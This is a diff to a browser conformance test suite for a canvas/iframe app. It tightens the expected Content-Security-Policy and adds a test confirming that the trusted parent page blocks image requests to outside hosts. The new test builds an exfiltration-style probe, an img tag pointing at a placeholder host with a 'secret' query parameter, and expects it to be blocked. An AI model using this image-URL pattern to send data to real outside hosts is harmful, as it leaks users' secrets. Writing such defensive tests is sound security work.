@@ -21,6 +21,7 @@ const VIEWER_SESSION = 's'.repeat(43);
 const PARENT_SESSION = 'parent-session-secret-not-for-viewer';
 const KEYCLOAK_SESSION = 'identity-provider-secret-not-for-viewer';
 const LIVE_FRAME = 'app-canvas-live-app-renderer iframe';
+const PARENT_CSP = "frame-ancestors 'none'; img-src 'self' blob: data:";
 
 interface SafeRequest {
   method: string;
@@ -132,7 +133,7 @@ test.describe('Dynamic Canvas production-browser conformance', () => {
     const navigation = await openCanvas(page);
     expect(navigation).not.toBeNull();
     const parentHeaders = await navigation!.allHeaders();
-    expect(parentHeaders['content-security-policy']).toBe("frame-ancestors 'none'");
+    expect(parentHeaders['content-security-policy']).toBe(PARENT_CSP);
     expect(parentHeaders['x-frame-options']).toBe('DENY');
 
     const productionScripts = await page.locator('script[src]').evaluateAll(elements =>
@@ -230,6 +231,37 @@ test.describe('Dynamic Canvas production-browser conformance', () => {
     for (const secret of [PARENT_SESSION, KEYCLOAK_SESSION, BRIDGE_NONCE, EXCHANGE_CODE]) {
       expect(combinedConsole).not.toContain(secret);
     }
+  });
+
+  test('blocks arbitrary image egress from the trusted parent document', async ({
+    context,
+    page,
+  }) => {
+    await installViewerGateway(context);
+    let outboundRequests = 0;
+    await context.route('https://markdown-image-probe.invalid/**', async route => {
+      outboundRequests++;
+      await route.abort('blockedbyclient');
+    });
+    await openCanvas(page);
+
+    const outcome = await page.evaluate(() => new Promise<string>(resolve => {
+      const image = document.createElement('img');
+      const timeout = window.setTimeout(() => resolve('timeout'), 2_000);
+      image.onload = () => {
+        window.clearTimeout(timeout);
+        resolve('loaded');
+      };
+      image.onerror = () => {
+        window.clearTimeout(timeout);
+        resolve('blocked');
+      };
+      image.src = 'https://markdown-image-probe.invalid/collect?secret=probe';
+      document.body.append(image);
+    }));
+
+    expect(outcome).toBe('blocked');
+    expect(outboundRequests).toBe(0);
   });
 
   test('enforces CSP, iframe sandboxing, and trusted-parent anti-framing', async ({
